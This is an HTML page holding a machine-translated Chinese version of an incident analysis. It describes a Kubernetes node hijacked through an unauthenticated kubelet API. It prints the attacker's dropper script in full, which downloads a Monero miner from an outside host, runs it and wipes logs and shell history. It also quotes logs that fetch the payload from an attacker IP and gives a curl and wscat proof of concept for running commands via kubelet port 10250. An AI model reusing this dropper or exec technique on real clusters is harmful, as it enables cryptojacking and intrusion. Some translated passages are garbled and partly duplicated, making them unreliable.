@@ -1,0 +1,116 @@
+<!doctype html>
+<html class="no-js" lang="en">
+
+<head>
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'UA-134228602-6');
+  </script>
+
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>👨🏿‍🔧 🥙 👨‍❤️‍💋‍👨 Kubernetes hack分析-通过kubelet后门 🚑 🍐 👩🏽‍🚒</title>
+  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
+  <meta name="description" content="对于Kubernetes一无所知，最近三年人们不得不住在一个山洞里。 Handy开发基础架构，CI / CD和生产均基于Kubernetes多集群生态系统构建。 可以说我们是Handy中Kubernetes的粉丝，这就是为什么当我们同事的Kubernetes私有集群上周末遭到黑客攻击时，我们感到非常...">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <link rel="stylesheet" href="../../css/main.css">
+
+  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>
+
+  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
+  <script>
+        var superSpecialObject = {};
+        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
+        superSpecialObject['enable_page_level_a' + 'ds'] = true;
+       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
+  </script>
+</head>
+
+<body>
+  <!--[if lte IE 9]>
+    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
+  <![endif]-->
+  <header class="page-header js-page-header">
+    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
+    <div class="page-header-text">Geekly articles weekly</div>
+  </header>
+  <section class="page js-page"><h1>Kubernetes hack分析-通过kubelet后门</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/southbridge/blog/413565/"><p><img src="https://habrastorage.org/webt/jf/iu/sw/jfiuswz3kv_toqc5ghhnm8-1cgu.jpeg"></p><br><p> 对于Kubernetes一无所知，最近三年人们不得不住在一个山洞里。  Handy开发基础架构，CI / CD和生产均基于Kubernetes多集群生态系统构建。 可以说我们是Handy中Kubernetes的粉丝，这就是为什么当我们同事的Kubernetes私有集群上周末遭到黑客攻击时，我们感到非常惊讶。 </p><br><p> 他们感到惊讶和欣喜，因为他们在Kubernetes中发现了一个鲜为人知的故障。 在本文中，我们将研究同事的集群是如何被黑客入侵的，以及如何通过在自己的集群中重新创建这种攻击来确认我们的发现。 该攻击已在Kubernetes 1.9中进行了测试，但可以在较旧的群集上使用。 </p><br><p>  <strong>免责声明</strong> ：本文是关于我们同事的个人服务器的。  <strong>基础设施便捷技术并未受到损害。</strong> </p><a name="habracut"></a><br><h3 id="hak"> 哈克 </h3><br><p> 有缺陷的集群是在Alpine Linux之上运行的唯一Kubernetes部署节点。 第一个黑客指示器是一个可疑进程，它是docker守护程序的子进程： </p><br><pre><code class="hljs powershell">/tmp/udevs <span class="hljs-literal"><span class="hljs-literal">-o</span></span> stratum+tcp://pool.zer0day.ru:<span class="hljs-number"><span class="hljs-number">8080</span></span> <span class="hljs-literal"><span class="hljs-literal">-u</span></span> NewWorld <span class="hljs-literal"><span class="hljs-literal">-p</span></span> NewWorld -<span class="hljs-literal"><span class="hljs-literal">-safe</span></span> <span class="hljs-literal"><span class="hljs-literal">-B</span></span></code> </pre> <br><p> 端点卷曲将返回以下文本： </p><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">Mining</span></span> Proxy Online</code> </pre> <br><p> 似乎有人找到了一种将加密矿软件放入工作容器并启动该过程的方法。 </p><br><p> 在<strong>docker</strong>覆盖目录中的容器<em>（/ var / lib / docker / overlay2 / b5a8a22f1e41b3b1ce504a6c941fb2805c28a454f75e2831c3a38d4d35388bd7）中</em>搜索<strong>udevs</strong>文件时，会下载并下载一个名称为<strong>“ kube.lock”的dropper</strong>脚本。 </p><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#!/bin/bash yum install wget -y apt-get install wget -y PS2=$(ps aux | grep udevs | grep -v "grep" | wc -l) if [ $PS2 -eq 0 ]; then rm -rf /tmp/udevs* wget https://transfer.sh/JyRqn/nodepadxx --no-check-certificate -O /tmp/udevs fi if [[ $? -ne 0 &amp;&amp; $PS2 -eq 0 ]]; then curl -sk https://transfer.sh/JyRqn/nodepadxx -o /tmp/udevs fi chmod +x /tmp/udevs chmod 777 /tmp/udevs if [ $PS2 -eq 0 ]; then /tmp/udevs -o stratum+tcp://pool.zer0day.ru:8080 -u NewWorld -p NewWorld --safe -B fi if [[ $? -ne 0 &amp;&amp; $PS2 -eq 0 ]]; then echo $? wget https://transfer.sh/9uRre/glibc-2.14.tar.gz --no-check-certificate -O /tmp/glibc-2.14.tar.gz &amp;&amp; tar zxvf /tmp/glibc-2.14.tar.gz -C /tmp/ &amp;&amp; export LD_LIBRARY_PATH=/tmp/opt/glibc-2.14/lib:$LD_LIBRARY_PATH &amp;&amp; /tmp/udevs -o stratum+tcp://pool.zer0day.ru:8080 -u NewWorld -p NewWorld --safe -B &amp;&amp; echo "" &gt; /var/log/wtmp &amp;&amp; echo "" &gt; /var/log/secure &amp;&amp; history -c fi</span></span></code> </pre> <br><p> 此外，VirusTotal上<strong>/ tmp / udevs程序</strong>的MD5签名<em>（a4404be67a41f144ea86a7838f357c26）</em> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">被定义</a>为可能的Monero Miner： </p><br><p><img src="https://habrastorage.org/webt/x8/jk/qp/x8jkqpi8y219s6uw0u7kmjqytka.png"></p><br><p> 因此，我们知道破解者以某种方式将<strong>kube.lock</strong>脚本放入容器中并运行它。 但是如何？ </p><br><p>  kubernetes api服务器的公共访问已打开，但受到证书身份验证的保护。 首先，我们假设集群中工作的图像之一在供应链上受到攻击。 但是，在研究了kubelet日志后，我们注意到了以下几点： </p><br><pre> <code class="hljs pgsql">/var/<span class="hljs-keyword"><span class="hljs-keyword">log</span></span>/kubernetes/kubelet.<span class="hljs-keyword"><span class="hljs-keyword">log</span></span>:E0311 <span class="hljs-number"><span class="hljs-number">12</span></span>:<span class="hljs-number"><span class="hljs-number">38</span></span>:<span class="hljs-number"><span class="hljs-number">30.400289</span></span> <span class="hljs-number"><span class="hljs-number">2991</span></span> remote_runtime.go:<span class="hljs-number"><span class="hljs-number">332</span></span>] ExecSync <span class="hljs-number"><span class="hljs-number">95</span></span>bd5c4a43003517c0077fbad285070fb3c5a94ff5d5c82e02c1d074635d1829 <span class="hljs-string"><span class="hljs-string">'curl http://185.10.68.202:5050/mrx -o /tmp/kube.lock'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> runtime service failed: rpc error: code = <span class="hljs-type"><span class="hljs-type">Internal</span></span> <span class="hljs-keyword"><span class="hljs-keyword">desc</span></span> = transport <span class="hljs-keyword"><span class="hljs-keyword">is</span></span> closing /var/<span class="hljs-keyword"><span class="hljs-keyword">log</span></span>/kubernetes/kubelet.<span class="hljs-keyword"><span class="hljs-keyword">log</span></span>:E0311 <span class="hljs-number"><span class="hljs-number">12</span></span>:<span class="hljs-number"><span class="hljs-number">38</span></span>:<span class="hljs-number"><span class="hljs-number">30.400974</span></span> <span class="hljs-number"><span class="hljs-number">2991</span></span> remote_runtime.go:<span class="hljs-number"><span class="hljs-number">332</span></span>] ExecSync <span class="hljs-number"><span class="hljs-number">916</span></span>f8bff4edb547a3e3de184968bb651717883e8b3856e76d0ebc95ecbeb3a3d <span class="hljs-string"><span class="hljs-string">'curl http://185.10.68.202:5050/mrx -o /tmp/kube.lock'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> runtime service failed: rpc error: code = <span class="hljs-type"><span class="hljs-type">Internal</span></span> <span class="hljs-keyword"><span class="hljs-keyword">desc</span></span> = transport <span class="hljs-keyword"><span class="hljs-keyword">is</span></span> closing</code> '从运行时 <code class="hljs pgsql">/var/<span class="hljs-keyword"><span class="hljs-keyword">log</span></span>/kubernetes/kubelet.<span class="hljs-keyword"><span class="hljs-keyword">log</span></span>:E0311 <span class="hljs-number"><span class="hljs-number">12</span></span>:<span class="hljs-number"><span class="hljs-number">38</span></span>:<span class="hljs-number"><span class="hljs-number">30.400289</span></span> <span class="hljs-number"><span class="hljs-number">2991</span></span> remote_runtime.go:<span class="hljs-number"><span class="hljs-number">332</span></span>] ExecSync <span class="hljs-number"><span class="hljs-number">95</span></span>bd5c4a43003517c0077fbad285070fb3c5a94ff5d5c82e02c1d074635d1829 <span class="hljs-string"><span class="hljs-string">'curl http://185.10.68.202:5050/mrx -o /tmp/kube.lock'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> runtime service failed: rpc error: code = <span class="hljs-type"><span class="hljs-type">Internal</span></span> <span class="hljs-keyword"><span class="hljs-keyword">desc</span></span> = transport <span class="hljs-keyword"><span class="hljs-keyword">is</span></span> closing /var/<span class="hljs-keyword"><span class="hljs-keyword">log</span></span>/kubernetes/kubelet.<span class="hljs-keyword"><span class="hljs-keyword">log</span></span>:E0311 <span class="hljs-number"><span class="hljs-number">12</span></span>:<span class="hljs-number"><span class="hljs-number">38</span></span>:<span class="hljs-number"><span class="hljs-number">30.400974</span></span> <span class="hljs-number"><span class="hljs-number">2991</span></span> remote_runtime.go:<span class="hljs-number"><span class="hljs-number">332</span></span>] ExecSync <span class="hljs-number"><span class="hljs-number">916</span></span>f8bff4edb547a3e3de184968bb651717883e8b3856e76d0ebc95ecbeb3a3d <span class="hljs-string"><span class="hljs-string">'curl http://185.10.68.202:5050/mrx -o /tmp/kube.lock'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> runtime service failed: rpc error: code = <span class="hljs-type"><span class="hljs-type">Internal</span></span> <span class="hljs-keyword"><span class="hljs-keyword">desc</span></span> = transport <span class="hljs-keyword"><span class="hljs-keyword">is</span></span> closing</code> </pre> <br><p> 看起来饼干在某种程度上是kubelet中的<strong>exec exec</strong> 。  Google应请求“身份验证Kubelet”发布了Kubernetes文档中的文本： </p><br><blockquote>  <em>默认情况下，未通过其他配置的身份验证方法拒绝的对HTTPS kubelet终结点的请求将被视为匿名请求，其使用<strong>系统：匿名</strong>用户名和<strong>系统：未认证组</strong> 。</em> </blockquote><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Kubelet身份验证/授权</a> </p><br><p> 如果在Kubelet中未指定任何标志，则默认情况下将使用接受未通过身份验证的API请求的模式。 请记住，要使主节点-&gt;节点链接正常工作，Kubernetes API服务器必须与节点上的kubelet交换信息。 </p><br><p> 事实证明，我们同事的服务器还公开暴露了kubelet端口（tcp 10250，tcp 10255）。 尽管错误很明显，但是最好检查一下自己的Kubernetes的部署方式。 </p><br><p>  <u>如果用户有权访问节点，则kubelet API是尚未通过API身份验证的群集的功能齐全的后门。</u> </p><br><p> 因此，如果您在激活身份验证和授权（webhook，RBAC等）时遇到问题，请确保保护kubelet。 </p><br><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">关于</a> Kubelet通信<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">的</a>安全性存在<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">严重的问题</a> ，这个问题值得更多关注。 </p><br><h3 id="dokazatelstvo-koncepcii"> 概念证明 </h3><br><p> 要将命令直接发送到kubelet，必须使用如下所述的API： </p><br><p><img src="https://habrastorage.org/webt/zl/5n/h2/zl5nh2hoybnvdyiacczyfsy2yv4.png"></p><br><p>  Kubelet侦听两个端口：10255和10250。第一个是只读HTTP端口，第二个是可以执行任何操作的HTTPS端口。 </p><br><p>  <strong>选择集群中的任何节点，然后尝试列出Pod：</strong> </p><br><pre> <code class="hljs powershell">curl -<span class="hljs-literal"><span class="hljs-literal">-insecure</span></span> https://kube<span class="hljs-literal"><span class="hljs-literal">-node</span></span><span class="hljs-literal"><span class="hljs-literal">-here</span></span>:<span class="hljs-number"><span class="hljs-number">10250</span></span>/pods | jq</code> </pre> <br><p>  <strong>exec</strong>的路由（未在kubelet页面上记录）与API服务器路由类似，但需要两个请求：初始POST和随后的GET，该GET使用支持SPDY的客户端（或也支持的Websocket客户端）。 </p><br><p>  <strong>通过kubelet在正在运行的容器中运行命令。</strong> </p><br><p> 找到要在上一个请求中作为目标的节点上运行的那个。 使用curl运行以下查询： </p><br><pre> <code class="hljs powershell">curl -<span class="hljs-literal"><span class="hljs-literal">-insecure</span></span> <span class="hljs-literal"><span class="hljs-literal">-v</span></span> <span class="hljs-literal"><span class="hljs-literal">-H</span></span> <span class="hljs-string"><span class="hljs-string">"X-Stream-Protocol-Version: v2.channel.k8s.io"</span></span> <span class="hljs-literal"><span class="hljs-literal">-H</span></span> <span class="hljs-string"><span class="hljs-string">"X-Stream-Protocol-Version: channel.k8s.io"</span></span> <span class="hljs-literal"><span class="hljs-literal">-X</span></span> POST <span class="hljs-string"><span class="hljs-string">"https://kube-node-here:10250/exec/&lt;namespace&gt;/&lt;podname&gt;/&lt;container-name&gt;?command=touch&amp;command=hello_world&amp;input=1&amp;output=1&amp;tty=1"</span></span></code> </pre> <br><p> 这应该返回带有代码302的响应，该响应将重定向到流： </p><br><pre> <code class="hljs pgsql">&lt; HTTP/<span class="hljs-number"><span class="hljs-number">2</span></span> <span class="hljs-number"><span class="hljs-number">302</span></span> &lt; <span class="hljs-keyword"><span class="hljs-keyword">location</span></span>: /cri/exec/PfWkLulG &lt; content-<span class="hljs-keyword"><span class="hljs-keyword">type</span></span>: <span class="hljs-type"><span class="hljs-type">text</span></span>/plain; charset=utf<span class="hljs-number"><span class="hljs-number">-8</span></span> &lt; content-length: <span class="hljs-number"><span class="hljs-number">0</span></span> &lt; <span class="hljs-type"><span class="hljs-type">date</span></span>: Tue, <span class="hljs-number"><span class="hljs-number">13</span></span> Mar <span class="hljs-number"><span class="hljs-number">2018</span></span> <span class="hljs-number"><span class="hljs-number">19</span></span>:<span class="hljs-number"><span class="hljs-number">21</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span> GMT</code> </pre> <br><p> 使用<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">wscat</a>启动流： </p><br><pre> <code class="hljs powershell">wscat <span class="hljs-literal"><span class="hljs-literal">-c</span></span> <span class="hljs-string"><span class="hljs-string">"https://kube-node-here:10250/cri/exec/PfWkLulG"</span></span> -<span class="hljs-literal"><span class="hljs-literal">-no</span></span><span class="hljs-literal"><span class="hljs-literal">-check</span></span> connected (press CTRL+C to quit) &lt; &lt; disconnected</code> </pre> <br><p> 由于我们只是<code>touch hello_world</code> ，因此它将创建文件并断开连接。 如果要执行带输出的命令，则在执行上述命令后将看到结果。 </p><br><h3 id="zaklyuchenie"> 结论 </h3><br><p> 尽管此行为与文档一致，但许多人不知道如果没有适当的配置，他们会在Kubernetes多用户环境中遇到安全漏洞。 </p><br><p> 我们已经讨论了Kubernetes的安全问题之一。 评论！ </p><br><h3 id="obnovlenie-14-marta-2018">  2018年3月14日补丁 </h3><br><p> 经过深入研究，似乎即使启用了Kubelet身份验证，它也仅适用于HTTPS端口（10250）。 这意味着只读的HTTP端口（10255）仍然保持打开状态，没有网络ACL以外的任何安全功能。 </p><br><p> 读取端口可以列出<code>/pods</code>路由上的炉床规格，这意味着可以访问敏感数据，例如环境变量。 </p><br><p> 就在28天前， <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">更改</a>了<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">代码，以便</a>默认情况下禁用不安全的端口。 </p><br><p> 原文： <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">分析Kubernetes黑客-通过kubelet进行后门</a> </p></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/zh-CN413565/">https://habr.com/ru/post/zh-CN413565/</a></p>
+<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
+<h4>More articles:</h4>
+<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
+<li><a href="../zh-CN413555/index.html">分布式系统中的安全互操作性</a></li>
+<li><a href="../zh-CN413557/index.html">NewSQL：SQL到处都行不通</a></li>
+<li><a href="../zh-CN413559/index.html">Web降级或如何使Web可读</a></li>
+<li><a href="../zh-CN413561/index.html">编译的Linq表达式树速度</a></li>
+<li><a href="../zh-CN413563/index.html">将包导入Go的4种方法</a></li>
+<li><a href="../zh-CN413567/index.html">Spring Boot中的微服务入门</a></li>
+<li><a href="../zh-CN413569/index.html">拆卸工厂18650锂离子电池</a></li>
+<li><a href="../zh-CN413571/index.html">第25期：IT培训-当前问题和领先公司的挑战</a></li>
+<li><a href="../zh-CN413575/index.html">BricsCAD Shape-Bricsys提供的免费3D CAD</a></li>
+<li><a href="../zh-CN413577/index.html">[公告]在俄罗斯七个城市的CodinGame.com上进行比赛的枢纽</a></li>
+</ul></nav>
+</section><br />
+<a href="../../allArticles.html"><strong>All Articles</strong></a>
+<script src="../../js/main.js"></script>
+
+<!-- Yandex.Metrika counter -->
+<script type="text/javascript" >
+  (function (d, w, c) {
+      (w[c] = w[c] || []).push(function() {
+          try {
+              w.yaCounter57283870 = new Ya.Metrika({
+                  id:57283870,
+                  clickmap:true,
+                  trackLinks:true,
+                  accurateTrackBounce:true,
+                  webvisor:true
+              });
+          } catch(e) { }
+      });
+
+      var n = d.getElementsByTagName("script")[0],
+          s = d.createElement("script"),
+          f = function () { n.parentNode.insertBefore(s, n); };
+      s.type = "text/javascript";
+      s.async = true;
+      s.src = "https://mc.yandex.ru/metrika/watch.js";
+
+      if (w.opera == "[object Opera]") {
+          d.addEventListener("DOMContentLoaded", f, false);
+      } else { f(); }
+  })(document, window, "yandex_metrika_callbacks");
+</script>
+<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
+
+<!-- Google Analytics -->
+  <script>
+    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
+    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
+  </script>
+  <script src="https://www.google-analytics.com/analytics.js" async defer></script>
+
+</section>
+
+<footer class="page-footer">
+  <div class="page-footer-legal-info-container page-footer-element">
+    <p>
+      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
+    </p>
+  </div>
+  <div class="page-footer-counters-container page-footer-element">
+    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
+  </div>
+</footer>
+  
+</body>
+
+</html>
